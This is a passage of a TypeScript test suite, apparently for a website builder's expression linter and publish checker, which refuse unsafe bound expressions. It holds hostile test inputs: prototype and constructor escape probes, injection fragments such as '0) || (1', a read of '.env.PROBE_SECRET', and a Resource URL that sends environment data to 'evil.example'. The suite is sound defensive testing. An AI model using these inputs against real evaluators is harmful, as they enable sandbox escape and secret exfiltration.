    expect(lint(`delete ${variable}.a`)).toEqual([]);
    expect(lint(`[...${variable}]`)).toEqual([]);
    expect(lint("/x/")).toEqual([]);
  });

  test("refuses a member named for a constructor or a prototype, however its key is written, and a key the source does not fix", () => {
    const members = [
      `""["constructor"]`,
      `""["con" + "structor"]`,
      `""[["constructor"]]`,
      `"".constru\\u0063tor`,
      `""?.constructor`,
      `${variable}[\`constructor\`]`,
      `${variable}.prototype`,
      `${variable}.__proto__`,
      `${variable}["__defineGetter__"]`,
      `${variable}.__defineSetter__`,
      `${variable}.__lookupGetter__`,
      `${variable}?.["__lookupSetter__"]`,
      `${variable}[${variable}]`,
      `${variable}[\`a\${${variable}}\`]`,
    ];
    refuses(members);
    for (const expression of members) {
      expect(lint(expression), expression).toEqual([]);
    }
  });

  test("refuses each object literal key it holds back, however the key is written", () => {
    const keys = [
      "__proto__",
      "valueOf",
      "toLocaleString",
      "toJSON",
      "then",
      ...expressionCallNames,
    ];
    expect(keys).toHaveLength(18);
    for (const key of keys) {
      for (const expression of [
        `({${key}: 1})`,
        `({"${key}": 1})`,
        `({["${key}"]: 1})`,
      ]) {
        expect(lint(expression), expression).toEqual([]);
        expect(expressionMayRun(expression), expression).toBe(false);
      }
    }
    // with a key it may not hold, though the linter accepts it
    refuses(['({valueOf: [].shift, length: 1, 0: "x"})']);
    expect(lint('({valueOf: [].shift, length: 1, 0: "x"})')).toEqual([]);
  });

  test("refuses an object property that is computed from a value, a getter or a method", () => {
    refuses([`({[${variable}]: 1})`, "({get x() { return 1 }})", "({f() {}})"]);
  });

  // An object literal's keys are the ones the expression fixes, so it holds
  // no shorthand property
  test("refuses a shorthand property", () => {
    const expressions = [`({${variable}})`, `({a: {${variable}}})`];
    refuses(expressions);
    for (const expression of expressions) {
      expect(lint(expression), expression).toEqual([]);
    }
    expect(expressionMayRun(`({a: ${variable}})`)).toBe(true);
  });

  // The keys a published object holds are the ones its source fixes,
  // whatever its data sources are named
  test("passes no object whose published keys hold one it may not hold, whatever its data sources are named", () => {
    const keys = [
      "__proto__",
      "valueOf",
      "toLocaleString",
      "toJSON",
      "then",
      ...expressionCallNames,
    ];
    const publishedKeys = (code: string) => {
      const found: string[] = [];
      const walk = (node: unknown) => {
        if (Array.isArray(node)) {
          node.forEach(walk);
          return;
        }
        if (typeof node !== "object" || node === null) {
          return;
        }
        const record = node as Record<string, unknown>;
        if (record.type === "Property") {
          const key = record.key as { name?: string; value?: unknown };
          found.push(String(key.name ?? key.value));
        }
        Object.values(record).forEach(walk);
      };
      walk(parseExpressionAt(code, 0, { ecmaVersion: "latest" }));
      return found;
    };
    const shapes = (name: string) => [
      `({${name}})`,
      `({a: {${name}}})`,
      `({a: ${name}})`,
      `({"a b": ${name}, c: [${name}]})`,
      `[{a: ${name}}, ${name}]`,
      `${name} ? {a: ${name}} : {b: 1}`,
    ];
    keys.forEach((key, index) => {
      const id = `key-${index}`;
      const dataSources = new Map<DataSource["id"], DataSource>([
        [
          id,
          {
            type: "variable",
            id,
            name: key,
            value: { type: "string", value: "" },
          },
        ],
      ]);
      const expressions = shapes(encodeDataSourceVariable(id));
      // what a shorthand property would publish
      const shorthand = generateExpression({
        expression: expressions[0],
        dataSources,
        usedDataSources: new Map(),
        scope: createScope(),
      });
      expect(publishedKeys(shorthand), key).toContain(key);
      for (const expression of expressions) {
        if (expressionMayRun(expression) === false) {
          continue;
        }
        const published = generateExpression({
          expression,
          dataSources,
          usedDataSources: new Map(),
          scope: createScope(),
        });
        expect(
          publishedKeys(published).filter((name) => keys.includes(name)),
          `${key}: ${published}`
        ).toEqual([]);
      }
    });
  });

  test("refuses a call whose arguments are not primitive or negative number literals", () => {
    const calls = [
      `"x".replace("x", ${variable})`,
      `${variable}.includes(${variable})`,
      `${variable}.join(${variable})`,
      `"x".replace("x", ${variable}.f)`,
      `"a".replace(/a/g, "b")`,
      `"x".replace(...["x", "y"])`,
      `${variable}.at(-${variable})`,
      `${variable}.at(-"1")`,
      `${variable}.at(+1)`,
      `${variable}.at(-1n)`,
      `${variable}.at(-(1))`,
    ];
    refuses(calls);
    expect(lint(`"x".replace("x", ${variable})`)).toEqual([]);
    expect(lint(`${variable}.includes(${variable})`)).toEqual([]);
  });

  test("accepts a negative number as a call argument", () => {
    for (const expression of [
      `${variable}.at(-1)`,
      `${variable}.slice(0, -1)`,
      `${variable}.slice(-3)`,
      `${variable}.split(",").at(-1)`,
    ]) {
      expect(lint(expression), expression).toEqual([]);
      expect(expressionMayRun(expression), expression).toBe(true);
    }
  });

  // An expression holds no `<` or `<<` followed later by a token that starts
  // with `>` (holdsAngleBrackets, shared with the action rule)
  test("refuses a < followed later by a > before a call", () => {
    const expressions = [`${variable} < 0 > ("x")`, `${variable} < 0 > \`x\``];
    refuses(expressions);
    for (const expression of expressions) {
      expect(lint(expression), expression).toEqual([]);
    }
  });

  test("refuses a < followed later by a > before a member or an operand", () => {
    const expressions = [
      '$ws$system < 1 >\n["x"]',
      `${variable} < 0 > ["a"] < 0 > ["b"]`,
      `${variable} < ${item} >\n${variable}`,
      `${variable} < 10 && ${variable} > 0`,
    ];
    refuses(expressions);
    for (const expression of expressions) {
      expect(lint(expression), expression).toEqual([]);
    }
    // a `>` before any `<`, and `<=`, are no < followed later by a >
    for (const expression of [
      `${variable} > 0 && ${variable} < 10`,
      `${variable} <= 10 && ${variable} >= 0`,
    ]) {
      expect(expressionMayRun(expression), expression).toBe(true);
    }
  });

  test("refuses a data source the module does not declare where it is written", () => {
    refuses([`${item}.title`, `"/" + ${item}.slug`], (id) => id !== "item-1");
    expect(expressionMayRun(`${variable}.title`, (id) => id !== "item-1")).toBe(
      true
    );
    // naming nothing at all
    refuses(
      [variable, `${variable}.title`, "$ws$system", "$ws$system.params.slug"],
      () => false
    );
    expect(expressionMayRun('"x"', () => false)).toBe(true);
    expect(expressionMayRun("undefined", () => false)).toBe(true);
  });

  // Input validation (code-check.ts) is the outer layer: what it refuses
  // may not run either
  test("refuses what input validation refuses", () => {
    for (const expression of [
      `${variable}[\`a\`]`,
      '({["a"]: 1})',
      "({constructor: 1})",
      "$ws$dataSource$",
    ]) {
      expect(checkValueExpression(expression).ok, expression).toBe(false);
      expect(expressionMayRun(expression), expression).toBe(false);
    }
  });

  test("reads $ws$system as the system data source", () => {
    const named: string[] = [];
    expressionMayRun("$ws$system.params.slug", (id) => {
      named.push(id);
      return true;
    });
    expect(named).toEqual([SYSTEM_VARIABLE_ID]);
  });

  test("accepts what the builder, its writers and its completion write", () => {
    for (const expression of [
      `${variable} === 'error'`,
      `(${variable}.location_name ?? "") !== ""`,
      `"/events/" + ${variable}.slug`,
      "$ws$system.params.slug",
      "$ws$system.search.q",
      "$ws$system.pathname",
      `(${variable}.x ?? "").slice(0, 160)`,
      `${variable}.toLowerCase()`,
      `\`\${${variable}} class_3\``,
      "undefined",
      "NaN",
      "Infinity",
      "404",
      "-1",
      "true",
      "null",
      '""',
      '"Bearer tok_123"',
      `{\n  "query": "query { a }",\n  "variables": ${variable},\n}`,
      '{"name":"x","list":[1,2]}',
      `(${variable}.ok === true ? ${variable}.data.data.slice(0, 1) : [])`,
      `${variable}.data['2b151fc7'].url`,
      `${variable}.data.data[0]["cover_image_url"]`,
      `${variable}["prop with spaces"]`,
      `${variable}?.ok === true`,
      `!(${variable})`,
      '[1, "a"]',
      "[1, , 2]",
      `${variable}.join(", ")`,
      `${variable} > 0 && ${variable} < 10`,
      `typeof ${variable} === "string"`,
      `({ a: ${variable}, "b c": 1, 2: [${variable}] })`,
      `(($ws$system.params.slug ?? "") !== "" && ${variable}?.ok === true && ${variable}.data.data.slug === $ws$system.params.slug) ? ${variable}.data.data.name : "Page not found"`,
    ]) {
      expect(lint(expression), expression).toEqual([]);
      expect(expressionMayRun(expression), expression).toBe(true);
    }
  });

  test("accepts what the form, email, Content Block and asset query writers write", () => {
    const formData = encodeDataSourceVariable("form-data");
    const browserInfo = encodeDataSourceVariable("browser-info");
    for (const expression of [
      // the Form (Beta) template's email subject
      `"Contact form: " + (${formData}.subject ?? "New message")`,
      // the email settings' defaults and the default body
      JSON.stringify(defaultEmailSubject),
      JSON.stringify(defaultEmailBody),
      getDefaultFormEmailBodyExpression(formData, browserInfo),
      // a Content Block's source bound to a field
      `${variable}.data.body`,
      // the asset query form's body, a route parameter and a variable among
      // its values
      createStructuredAssetQueryResourceBody({
        where: {
          all: [
            {
              field: ["properties", "draft"],
              operator: "ne",
              value: "true",
            },
            {
              field: ["properties", "slug"],
              operator: "eq",
              value: "$ws$system.params.slug",
            },
            {
              field: ["properties", "tag"],
              operator: "eq",
              value: variable,
            },
          ],
        },
        sort: [{ field: ["properties", "date"], direction: "desc" }],
        limit: "10",
        offset: "0",
        output: { mode: "all", includeMetadata: true },
        content: { mode: "none" },
      } as never),
    ]) {
      expect(expressionMayRun(expression), expression).toBe(true);
    }
  });

  // The methods an expression may call are the linter's, kept equal here
  test("calls the methods the linter allows, and no other", () => {
    expect([...expressionCallNames].sort()).toEqual(
      [...new Set([...allowedStringMethods, ...allowedArrayMethods])].sort()
    );
  });

  test("accepts every expression the OrganizeOS blocks' templates write", () => {
    const expressions = Object.entries(organizeosTemplates).flatMap(
      ([name, meta]) => {
        const fragment = renderTemplate(meta.template);
        return [
          ...fragment.props.flatMap((prop) =>
            prop.type === "expression" ? [{ name, value: prop.value }] : []
          ),
          ...fragment.instances.flatMap((instance) =>
            instance.children.flatMap((child) =>
              child.type === "expression" ? [{ name, value: child.value }] : []
            )
          ),
        ];
      }
    );
    // the forms' states and shows, the cards' fields and links
    expect(expressions.length).toBeGreaterThanOrEqual(18);
    expect(
      expressions.filter(({ value }) => expressionMayRun(value) === false)
    ).toEqual([]);
  });
});

// An expression names only data sources the published module declares where
// it is written; the Publish dialog lists the same items
// (docs/ORGANIZEOS-FORK.md section 10).
describe("findPausedExpressions", () => {
  const param = encodeDataSourceVariable("param-1");
  const key = encodeDataSourceVariable("key-1");
  const variable = encodeDataSourceVariable("var-1");
  const resourceVariable = encodeDataSourceVariable("res-ds");

  const instance = (
    id: string,
    component: string,
    children: Instance["children"] = []
  ): Instance => ({ type: "instance", id, component, children });
  const idsOf = (...list: string[]): Instance["children"] =>
    list.map((value) => ({ type: "id", value }));
  const bound = (instanceId: string, name: string, value: string): Prop => ({
    id: `${instanceId}:${name}`,
    instanceId,
    name,
    type: "expression",
    value,
  });
  const parameterProp = (
    instanceId: string,
    name: string,
    value: string
  ): Prop => ({
    id: `${instanceId}:${name}`,
    instanceId,
    name,
    type: "parameter",
    value,
  });
  const pageOf = (init: Partial<Page> = {}): Page => ({
    id: "home",
    name: "Home",
    title: '"Home"',
    path: "",
    rootInstanceId: "body",
    meta: {},
    ...init,
  });
  // A Collection's item and key, a variable and a Resource's data source,
  // named where the module does not declare them
  const dataSourceList: DataSource[] = [
    {
      type: "parameter",
      id: "param-1",
      name: "process",
      scopeInstanceId: "list",
    },
    { type: "parameter", id: "key-1", name: "key", scopeInstanceId: "list" },
    {
      type: "variable",
      id: "var-1",
      name: "state",
      scopeInstanceId: "body",
      value: { type: "string", value: "idle" },
    },
    {
      type: "resource",
      id: "res-ds",
      name: "process",
      scopeInstanceId: "body",
      resourceId: "res-1",
    },
  ];
  const resource = (init: Partial<Resource> = {}): Resource => ({
    id: "res-1",
    name: "Items",
    method: "get",
    url: '"https://example.org/items"',
    headers: [],
    ...init,
  });
  const toMap = <Item extends { id: string }>(list: Item[]) =>
    new Map(list.map((item) => [item.id, item]));

  // A body holding a Box and a Collection with a Box inside it
  const find = ({
    pages = [pageOf()],
    bodyChildren = [],
    instances = [],
    props = [],
    boxChildren = [],
    resources = [resource()],
    dataSources = dataSourceList,
  }: {
    pages?: Page[];
    bodyChildren?: string[];
    instances?: Instance[];
    props?: Prop[];
    boxChildren?: Instance["children"];
    resources?: Resource[];
    dataSources?: DataSource[];
  } = {}) =>
    findPausedExpressions({
      pages,
      instances: toMap([
        instance("body", "Body", idsOf("box", "list", ...bodyChildren)),
        instance("box", "Box", boxChildren),
        instance("list", collectionComponent, idsOf("inner")),
        instance("inner", "Box"),
        ...instances,
      ]),
      props: [
        bound("list", "data", "[1, 2]"),
        parameterProp("list", "item", "param-1"),
        parameterProp("list", "itemKey", "key-1"),
        ...props,
      ],
      dataSources: toMap(dataSources),
      resources: toMap(resources),
    });

  test("pauses a name the page module does not declare where it is written, and keeps it inside its Collection", () => {
    expect(
      find({
        props: [
          bound("box", "title", `${param}.env.PROBE_SECRET`),
          bound("inner", "title", `${param}.env.PROBE_SECRET`),
          bound("inner", "data-index", key),
          bound("inner", "data-state", variable),
          // the Collection's own props may not name its item
          bound("list", "data-ws-show", `${param}.ok`),
        ],
      })
    ).toEqual([
      { kind: "prop", instanceId: "box", propId: "box:title", name: "title" },
      {
        kind: "prop",
        instanceId: "list",
        propId: "list:data-ws-show",
        name: "data-ws-show",
      },
    ]);
  });

  test("pauses a parameter prop outside its Collection, and a Collection's item or itemKey that is not a parameter", () => {
    expect(
      find({
        props: [
          parameterProp("box", "title", "param-1"),
          parameterProp("inner", "title", "param-1"),
        ],
      })
    ).toEqual([
      { kind: "prop", instanceId: "box", propId: "box:title", name: "title" },
    ]);
    const paused = findPausedExpressions({
      pages: [pageOf()],
      instances: toMap([
        instance("body", "Body", idsOf("list")),
        instance("list", collectionComponent),
      ]),
      props: [
        bound("list", "data", "[1]"),
        bound("list", "item", "item"),
        {
          id: "list:itemKey",
          instanceId: "list",
          name: "itemKey",
          type: "string",
          value: "key",
        },
      ],
      dataSources: new Map(),
      resources: new Map(),
    });
    expect(paused.map((item) => item.kind === "prop" && item.name)).toEqual([
      "item",
      "itemKey",
    ]);
  });

  test("pauses a text child that may not run, by its index", () => {
    expect(
      find({
        boxChildren: [
          { type: "text", value: "Hello" },
          { type: "expression", value: '"t") && (1' },
          { type: "expression", value: variable },
          { type: "expression", value: `${param}.title` },
        ],
      })
    ).toEqual([
      { kind: "child", instanceId: "box", index: 1 },
      { kind: "child", instanceId: "box", index: 3 },
    ]);
  });

  test("pauses a page setting that names a Collection's parameter or may not run, and keeps one that names a Resource or a variable", () => {
    expect(
      find({
        pages: [
          pageOf({
            title: `${param}.title`,
            meta: {
              description: "0) || (1",
              excludePageFromSearch: `${param}.x`,
              language: '"".constructor',
              socialImageUrl: `${resourceVariable}.data.url`,
              status: "200",
              redirect: `"/" + ${param}`,
              content: variable,
              custom: [
                { property: "og:type", content: '"website"' },
                { property: "og:x", content: `${param}.x` },
              ],
            },
          }),
        ],
      })
    ).toEqual(
      [
        "title",
        "description",
        "excludePageFromSearch",
        "language",
        "redirect",
        "custom.1",
      ].map((field) => ({ kind: "page", pageId: "home", field }))
    );
    expect(
      find({ pages: [pageOf({ title: `${resourceVariable}.data.title` })] })
    ).toEqual([]);
  });

  test("pauses a Resource a page loads when a field names what its module does not declare or may not run, or a name is not plain", () => {
    for (const paused of [
      resource({ url: `"https://evil.example/?k=" + ${param}.env` }),
      resource({ url: "0) || (1" }),
      resource({ searchParams: [{ name: "q", value: '"".constructor' }] }),
      resource({ headers: [{ name: "x", value: `${param}.x` }] }),
      resource({ body: "({then: 1})" }),
      resource({
        headers: [{ name: 'x"y', value: '"1"' }],
      }),
      resource({ searchParams: [{ name: 'q"', value: '"1"' }] }),
      resource({ searchParams: [{ name: "q\n", value: '"1"' }] }),
    ]) {
      expect(find({ resources: [paused] }), JSON.stringify(paused)).toEqual([
        { kind: "resource", resourceId: "res-1" },
      ]);
    }
  });

  test("pauses a Resource a page loads whose header or search name input validation refuses", () => {
    for (const paused of [
      resource({ headers: [{ name: "X Custom", value: '"1"' }] }),
      resource({ headers: [{ name: "x:y", value: '"1"' }] }),
      resource({ searchParams: [{ name: "q\u2028", value: '"1"' }] }),
    ]) {
      expect(find({ resources: [paused] }), JSON.stringify(paused)).toEqual([
        { kind: "resource", resourceId: "res-1" },
      ]);
    }
  });

  test("pauses an expression, a page setting and a Resource that name a data source publishing leaves out", () => {
    const paused = (dropped: Set<string>, resources = [resource()]) =>
      findPausedExpressions({
        pages: [
          pageOf({
            title: `${resourceVariable}.title`,
            meta: { description: variable },
          }),
        ],
        instances: toMap([
          instance("body", "Body", idsOf("box")),
          instance("box", "Box", [{ type: "expression", value: variable }]),
        ]),
        props: [
          bound("box", "title", `${resourceVariable}.x`),
          bound("box", "data-state", variable),
          {
            id: "box:action",
            instanceId: "box",
            name: "action",
            type: "resource",
            value: "res-2",
          },
        ],
        dataSources: toMap(dataSourceList),
        resources: toMap([
          ...resources,
          resource({
            id: "res-2",
            headers: [{ name: "x-state", value: variable }],
          }),
        ]),
        dropped,
      });
    // nothing goes
    expect(paused(new Set())).toEqual([]);
    // the variable goes before this runs
    expect(paused(new Set(["var-1"]))).toEqual([
      { kind: "resource", resourceId: "res-2" },
      { kind: "page", pageId: "home", field: "description" },
      {
        kind: "prop",
        instanceId: "box",
        propId: "box:data-state",
        name: "data-state",
      },
      { kind: "child", instanceId: "box", index: 0 },
    ]);
    // a Resource that goes takes its data source
    expect(paused(new Set(), [resource({ url: "0) || (1" })])).toEqual([
      { kind: "resource", resourceId: "res-1" },
      { kind: "page", pageId: "home", field: "title" },
      { kind: "prop", instanceId: "box", propId: "box:title", name: "title" },
    ]);
  });

  test("keeps a Resource whose fields name a variable or $ws$system, with no body", () => {
    expect(
      find({
        resources: [
          resource({
            url: '"https://example.org/items/" + ($ws$system.params.slug ?? "-")',
            searchParams: [{ name: "state", value: variable }],
            headers: [{ name: "Authorization", value: '"Bearer x"' }],
            body: "",
          }),
        ],
      })
    ).toEqual([]);
  });

  test("checks a Resource no page loads for input validation alone, and marks it unpublished", () => {
    const resources = [resource(), resource({ id: "res-2", url: "0) || (1" })];
    expect(find({ resources })).toEqual([
      { kind: "resource", resourceId: "res-2", unpublished: true },
    ]);
    // a Resource no page loads that names what no module declares is not
    // published, and input validation passes it
    expect(
      find({
        resources: [resource(), resource({ id: "res-2", url: `${param}.x` })],
      })
    ).toEqual([]);
    expect(
      find({
        resources,
        props: [
          {
            id: "box:action",
            instanceId: "box",
            name: "action",
            type: "resource",
            value: "res-2",
          },
        ],
      })
    ).toEqual([{ kind: "resource", resourceId: "res-2" }]);
  });

  test("checks every expression prop, an XML Node's on an XML page included", () => {
    expect(
      find({
        pages: [pageOf({ meta: { documentType: "xml" } })],
        bodyChildren: ["node"],
        instances: [instance("node", "XmlNode")],
        props: [
          bound("node", "tag", '"loc"'),
          bound("node", "title", '"x"} data-x={1'),
        ],
      })
    ).toEqual([
      { kind: "prop", instanceId: "node", propId: "node:title", name: "title" },
    ]);
  });

  test("checks a Slot's Fragment in every place it shows, and lists it once", () => {
    const fragmentChildren: Instance["children"] = [
      { type: "expression", value: `${param}.title` },
    ];
    expect(
      find({
        // inside the Collection, and again outside it
        bodyChildren: ["outside"],
        instances: [
          instance("inner", "Slot", idsOf("fragment")),
          instance("outside", "Slot", idsOf("fragment")),
          instance("fragment", "Fragment", idsOf("text")),
          instance("text", "Text", fragmentChildren),
        ],
      }).filter((item) => item.kind === "child")
    ).toEqual([{ kind: "child", instanceId: "text", index: 0 }]);
    // inside the Collection only, it may name the item
    expect(
      find({
        instances: [
          instance("inner", "Slot", idsOf("fragment")),
          instance("fragment", "Fragment", idsOf("text")),
          instance("text", "Text", fragmentChildren),
        ],
      })
    ).toEqual([]);
  });

  test("lets an expression name an id the page does not hold", () => {
    expect(
      find({
        props: [
          bound("box", "title", `${encodeDataSourceVariable("missing")}.x`),
        ],
        boxChildren: [{ type: "expression", value: `${param}.title` }],
        // the Collection's item is scoped to an instance on no page
        dataSources: dataSourceList.map((item) =>
          item.id === "param-1"
            ? { ...item, scopeInstanceId: "elsewhere" }
            : item
        ),
      })
    ).toEqual([]);
  });

  test("reads what only a Content Block's templates hold, or no page holds, for input validation alone, and marks it unpublished", () => {
    expect(
      find({
        bodyChildren: ["block"],
        instances: [
          instance("block", blockComponent, idsOf("templates")),
          instance("templates", blockTemplateComponent, idsOf("template")),
          instance("template", "Box", [
            { type: "expression", value: "0) || (1" },
            { type: "expression", value: `${param}.x` },
          ]),
          instance("orphan", "Box", [{ type: "expression", value: "a()" }]),
        ],
        props: [
          bound("template", "title", "0) || (1"),
          bound("template", "alt", `${param}.x`),
          bound("orphan", "title", "a()"),
        ],
      })
    ).toEqual([
      {
        kind: "prop",
        instanceId: "template",
        propId: "template:title",
        name: "title",
        unpublished: true,
      },
      {
        kind: "prop",
        instanceId: "orphan",
        propId: "orphan:title",
        name: "title",
        unpublished: true,
      },
      { kind: "child", instanceId: "template", index: 0, unpublished: true },
      { kind: "child", instanceId: "orphan", index: 0, unpublished: true },
    ]);
  });

  test("reads a page template's settings and a page's meta title for input validation alone, and marks them unpublished", () => {
    expect(
      findPausedExpressions({
        pages: [pageOf({ meta: { title: "a()" } })],
        templates: [
          {
            id: "template",
            name: "Template",
            title: "a()",
            rootInstanceId: "body",
            meta: {
              description: '"x"',
              status: "0) || (1",
              custom: [{ property: "og:x", content: `${param}.x` }],
            },
          },
        ],
        instances: toMap([instance("body", "Body")]),
        props: [],
        dataSources: new Map(),
        resources: new Map(),
      })
    ).toEqual([
      { kind: "page", pageId: "home", field: "metaTitle", unpublished: true },
      { kind: "page", pageId: "template", field: "title", unpublished: true },
      { kind: "page", pageId: "template", field: "status", unpublished: true },
    ]);
  });

  test("keeps every expression of a page built from each OrganizeOS block's template", () => {
    let expressions = 0;
    for (const [name, meta] of Object.entries(organizeosTemplates)) {
      const fragment = renderTemplate(meta.template);
      const body = instance("page-body", "Body", fragment.children);
      expressions += fragment.props.filter(
        (prop) => prop.type === "expression"
      ).length;
      expect(
        findPausedExpressions({
          pages: [pageOf({ rootInstanceId: body.id })],
          instances: toMap([body, ...fragment.instances]),
          props: fragment.props,
          dataSources: toMap(fragment.dataSources),
          resources: toMap(fragment.resources),
        }),
        name
      ).toEqual([]);
    }
    expect(expressions).toBeGreaterThan(0);
  });
  test("holds what prebuild holds: a missing root, a :root root and a :root instance below the root", () => {
    const process: DataSource = {
      type: "parameter",
      id: "p",
      name: "process",
      scopeInstanceId: "ghost",
    };
    const named = encodeDataSourceVariable("p");
    // the root instance is missing; what is scoped to it is still held
    expect(
      findPausedExpressions({
        pages: [pageOf({ rootInstanceId: "ghost", title: `${named}.x` })],
        instances: new Map(),
        props: [],
        dataSources: toMap([
          process,
          {
            type: "resource",
            id: "r-ds",
            name: "r",
            scopeInstanceId: "ghost",
            resourceId: "res-1",
          },
        ]),
        resources: toMap([resource({ url: "0) || (1" })]),
      })
    ).toEqual([
      { kind: "resource", resourceId: "res-1" },
      { kind: "page", pageId: "home", field: "title" },
    ]);
    // the root is :root, and a :root instance sits below the root
    for (const [rootInstanceId, tree] of [
      [":root", [instance(":root", "Body", idsOf("box"))]],
      [
        "body",
        [
          instance("body", "Body", idsOf(":root")),
          instance(":root", "Box", idsOf("box")),
        ],
      ],
    ] as const) {
      expect(
        findPausedExpressions({
          pages: [pageOf({ rootInstanceId })],
          instances: toMap([...tree, instance("box", "Box")]),
          props: [bound("box", "title", `${named}.x`)],
          dataSources: toMap([{ ...process, scopeInstanceId: "box" }]),
          resources: new Map(),
        }),
        rootInstanceId
      ).toEqual([
        { kind: "prop", instanceId: "box", propId: "box:title", name: "title" },
      ]);
    }
  });

  test("pauses every item or itemKey of a Collection that holds more than one", () => {
    for (const name of ["item", "itemKey"]) {
      const paused = findPausedExpressions({
        pages: [pageOf()],
        instances: toMap([
          instance("body", "Body", idsOf("list")),
          instance("list", collectionComponent, idsOf("inner")),
          instance("inner", "Box"),
        ]),
        props: [
          bound("list", "data", "[1]"),
          { ...parameterProp("list", name, "param-1"), id: `${name}-1` },
          { ...parameterProp("list", name, "var-1"), id: `${name}-2` },
          bound("inner", "title", `${param}.env`),
        ],
        dataSources: toMap(dataSourceList),
        resources: toMap([resource()]),
      });
      expect(paused, name).toEqual([
        { kind: "prop", instanceId: "list", propId: `${name}-1`, name },
        { kind: "prop", instanceId: "list", propId: `${name}-2`, name },
        {
          kind: "prop",
          instanceId: "inner",
          propId: "inner:title",
          name: "title",
        },
      ]);
    }
  });

  // A Collection's item and key may each be only a parameter of its own that
  // nothing around it binds
  test("pauses a Collection's item or itemKey that names another variable, the page's system data source, an outer Collection's or its own other binding", () => {
    const system: DataSource = {
      type: "parameter",
      id: "system-ds",
      name: "system",
      scopeInstanceId: "body",
    };
    const outerItem: DataSource = {
      type: "parameter",
      id: "outer-item",
      name: "row",
      scopeInstanceId: "outer",
    };
    const check = (props: Prop[]) =>
      findPausedExpressions({
        pages: [pageOf({ systemDataSourceId: "system-ds" })],
        instances: toMap([
          instance("body", "Body", idsOf("outer")),
          instance("outer", collectionComponent, idsOf("list")),
          instance("list", collectionComponent, idsOf("inner")),
          instance("inner", "Box"),
        ]),
        props: [
          bound("outer", "data", "[[1]]"),
          parameterProp("outer", "item", "outer-item"),
          bound("list", "data", "[1]"),
          ...props,
        ],
        dataSources: toMap([...dataSourceList, system, outerItem]),
        resources: toMap([resource()]),
      }).filter((item) => item.kind === "prop" && item.instanceId === "list");
    for (const value of ["var-1", "system-ds", "outer-item"]) {
      expect(check([parameterProp("list", "item", value)]), value).toEqual([
        { kind: "prop", instanceId: "list", propId: "list:item", name: "item" },
      ]);
    }
    expect(
      check([
        parameterProp("list", "item", "param-1"),
        parameterProp("list", "itemKey", "param-1"),
      ])
    ).toEqual([
      { kind: "prop", instanceId: "list", propId: "list:item", name: "item" },
      {
        kind: "prop",
        instanceId: "list",
        propId: "list:itemKey",
        name: "itemKey",
      },
    ]);
    // its own item and key
    expect(
      check([
        parameterProp("list", "item", "param-1"),
        parameterProp("list", "itemKey", "key-1"),
      ])
    ).toEqual([]);
  });

  test("pauses a Resource named like a global a module reads", () => {
    expect(find({ resources: [resource({ name: "Map" })] })).toEqual([
      { kind: "resource", resourceId: "res-1" },
    ]);
    expect(find({ resources: [resource({ name: "Map list" })] })).toEqual([]);
  });

  test("pauses a data source named like a global a module reads", () => {
    const variableOf = (id: string, name: string): DataSource => ({
      type: "variable",
      id,
      name,
      scopeInstanceId: "body",
      value: { type: "string", value: "" },
    });
    const globals = [...generatedCodeGlobals];
    const paused = findPausedExpressions({
      pages: [pageOf()],
      instances: toMap([
        instance("body", "Body", idsOf("box")),
        instance("box", "Box"),
      ]),
      props: [bound("box", "title", encodeDataSourceVariable("global-Object"))],
      dataSources: toMap([
        ...globals.map((name) => variableOf(`global-${name}`, name)),
        variableOf("kept", "state"),
        variableOf("near", "Object_1"),
      ]),
      resources: new Map(),
    });
    // NaN and Infinity are reserved, so the module never names a data source
    // like them; what names one that goes goes too
    expect(paused).toEqual([
      ...["Array", "Error", "Map", "Number", "Object", "String"].map(
        (name) => ({
          kind: "dataSource",
          dataSourceId: `global-${name}`,
        })
      ),
      { kind: "prop", instanceId: "box", propId: "box:title", name: "title" },
    ]);
  });

  test("pauses a Resource the build does not hold, named by a data source or a resource prop a page holds", () => {
    expect(
      find({
        dataSources: [
          ...dataSourceList,
          {
            type: "resource",
            id: "dangling-ds",
            name: "d",
            scopeInstanceId: "body",
            resourceId: "missing",
          },
        ],
        props: [
          {
            id: "box:action",
            instanceId: "box",
            name: "action",
            type: "resource",
            value: "gone",
          },
        ],
      })
    ).toEqual([
      { kind: "resource", resourceId: "gone" },
      { kind: "resource", resourceId: "missing" },
    ]);
  });

  test("reads a Collection's own text children inside it, and its props outside it", () => {
    expect(
      find({
        instances: [
          instance("list", collectionComponent, [
            { type: "expression", value: `${param}.title` },
            ...idsOf("inner"),
          ]),
        ],
        props: [bound("list", "data-ws-show", `${param}.title`)],
      })
    ).toEqual([
      {
        kind: "prop",
        instanceId: "list",
        propId: "list:data-ws-show",
        name: "data-ws-show",
      },
    ]);
  });

  test("leaves out of the data sources that ship those of a paused Resource and each paused data source", () => {
    const dataSources = toMap<DataSource>([
      ...dataSourceList,
      {
        type: "variable",
        id: "global-Object",
        name: "Object",
        scopeInstanceId: "body",
        value: { type: "string", value: "" },
      },
    ]);
    const shipped = withoutPausedDataSources(dataSources, [
      { kind: "resource", resourceId: "res-1" },
      { kind: "dataSource", dataSourceId: "global-Object" },
      { kind: "prop", instanceId: "box", propId: "box:title", name: "title" },
    ]);
    expect([...shipped.keys()]).toEqual(["param-1", "key-1", "var-1"]);
    expect(dataSources.size).toBe(5);
  });

  test("pauses what names a data source that goes for its id or name, or with its instance, in the shared order", () => {
    const variableOf = (
      id: string,
      name: string,
      scopeInstanceId: string
    ): DataSource => ({
      type: "variable",
      id,
      name,
      scopeInstanceId,
      value: { type: "string", value: "" },
    });
    const { collidingIds, pausedExpressions } = findPausedPublishing({
      pages: [pageOf()],
      pageNames: [{ rootInstanceId: "body" }],
      pageRootIds: new Set(["body"]),
      instances: toMap([
        instance("body", "Body", idsOf("box", "gone")),
        instance("box", "Box"),
        instance("gone", "Box"),
      ]),
      dataSources: toMap([
        // an id that is a component's
        variableOf("Box", "tag", "body"),
        // a name no data source may take
        variableOf("map-var", "Map", "body"),
        // a variable of an instance publishing leaves out
        variableOf("gone-var", "state", "gone"),
        variableOf("kept-var", "kept", "body"),
      ]),
      props: toMap([
        bound("box", "title", `${encodeDataSourceVariable("Box")}.x`),
        bound("box", "alt", encodeDataSourceVariable("map-var")),
        bound("box", "data-state", encodeDataSourceVariable("gone-var")),
        bound("box", "data-kept", encodeDataSourceVariable("kept-var")),
      ]),
      resources: new Map(),
      ships: (dataSource) => dataSource.scopeInstanceId !== "gone",
    });
    expect([...collidingIds]).toEqual(["Box", "map-var"]);
    expect(pausedExpressions).toEqual([
      { kind: "prop", instanceId: "box", propId: "box:title", name: "title" },
      { kind: "prop", instanceId: "box", propId: "box:alt", name: "alt" },
      {
        kind: "prop",
